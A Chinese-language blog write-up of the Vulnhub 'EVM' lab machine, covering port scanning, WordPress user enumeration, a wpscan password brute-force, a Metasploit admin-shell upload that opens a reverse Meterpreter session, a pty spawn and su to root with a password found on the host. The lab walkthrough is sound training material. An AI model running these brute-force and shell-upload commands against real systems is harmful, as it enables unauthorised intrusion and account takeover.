---
layout: post
title: "EVM walkthrough"
date: 2021-07-10
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP              |
| ------------- | --------------- |
| 本机（Win10） | `192.168.1.115` |
| Kali          | `192.168.1.116` |
| EVM           | `192.168.1.121` |

### 扫描端口和版本信息

`nmap -A 192.168.1.121`

```shell
┌──(root💀kali)-[~]
└─# nmap -A 192.168.1.121
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 00:36 UTC
Nmap scan report for 192.168.1.121
Host is up (0.0071s latency).
Not shown: 993 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA AUTH-RESP-CODE SASL UIDL RESP-CODES TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ENABLE ID IDLE post-login have SASL-IR more listed capabilities LOGINDISABLEDA0001 Pre-login LITERAL+ IMAP4rev1 LOGIN-REFERRALS OK
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
|   Domain name: \x00
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2021-07-09T20:37:03-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-07-10T00:37:03
|_  start_date: N/A
```

结果显示靶机除了开启比较正常的**22**、**80**端口外，还开启了邮件服务、Samba服务以及DNS解析服务（**53**端口）。此外使用*dirb*工具枚举目录可知，网站存在执行*phpinfo()*代码的*/info.php*页面和*/wordpress/*路径。

> 另一方面作者在Apache默认页面中也给出了提示信息：`you can find me at /wordpress/ im vulnerable webapp :) `

### 访问Web

在访问*/wordpress/index.php*时，发现其他资源请求的IP地址是*192.168.56.103*，因此可以在Linux中通过*iptables*添加规则，将IP地址映射为*192.168.1.121*即可正常显示。

> 通过修改*/etc/hosts*文件则不会成功，因为该文件是将名称映射到IP地址上，而不是直接在IP地址之间映射

因为网站搭建的是WordPress CMS，那么就直接选择用*wpscan*工具进行扫描，首先进行用户枚举：

```shell
┌──(root💀kali)-[~]
└─# wpscan --url http://192.168.1.121/wordpress/ -e u
_______________________________________________________________
...
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:11 <================================> (10 / 10) 100.00% Time: 00:00:11

[i] User(s) Identified:

[+] c0rrupt3d_brain
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 ...
```

得到一个用户名：*c0rrupt3d_brain*，再经过枚举插件无果后进行密码爆破：

```shell
┌──(root💀kali)-[~]
└─# wpscan --url http://192.168.1.121/wordpress/ -U c0rrupt3d_brain -P /usr/share/wordlists/Passwords/Leaked_Databases/rockyou-60.txt -t 100
_______________________________________________________________
...
[!] Valid Combinations Found:
 | Username: c0rrupt3d_brain, Password: 24992499
...
```

至此我们得到了一个用户名和密码：*c0rrupt3d_brain:24992499*

### Getshell

使用*msfconsole*中的WordPress脚本进行登录：

```shell
┌──(root💀kali)-[~]
└─# msfconsole
...
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password 24992499
password => 24992499
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 192.168.1.121
rhosts => 192.168.1.121
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
targeturi => /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username c0rrupt3d_brain
username => c0rrupt3d_brain
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.116:4444
[*] Authenticating with WordPress using c0rrupt3d_brain:24992499...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/cJpylkzjQl/hagJoxAcqj.php...
[*] Sending stage (39282 bytes) to 192.168.1.121
[*] Meterpreter session 1 opened (192.168.1.116:4444 -> 192.168.1.121:39460) at 2021-07-10 09:01:58 +0000
[+] Deleted hagJoxAcqj.php
[+] Deleted cJpylkzjQl.php
[+] Deleted ../cJpylkzjQl

meterpreter >
```

探寻后在*/home/root3r/.root_password_ssh.txt*文件中发现*root*账户的密码：*willy26*

### 提权

通过*root:willy26*账户名和密码切换到*root*账户即可：

```shell
meterpreter > shell
Process 10861 created.
Channel 2 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
su root
su: must be run from a terminal
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$

www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ ls
ls
test.txt
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ su root
su root
Password: willy26

root@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r#
```

最后在*/root/proof.txt*文件中得到flag：

```shell
root@ubuntu-extermely-vulnerable-m4ch1ine:~# cat proof.txt
cat proof.txt
voila you have successfully pwned me :) !!!
:D
root@ubuntu-extermely-vulnerable-m4ch1ine:~#
```

### 总结

1. 对WordPress CMS 进行密码爆破时优先选择*wpscan*，而不是*hydra*等类似工具，命令为：`wpscan --url http://192.168.1.121/wordpress/ -U c0rrupt3d_brain -P /usr/share/wordlists/Passwords/Leaked_Databases/rockyou.txt -t 100`
2. 对WordPress CMS上传shell，并且在网页进行登录比较麻烦的情况下可选择*msfconsole*渗透框架中的*/exploit/unix/webapp/wp_admin_shell_upload*脚本。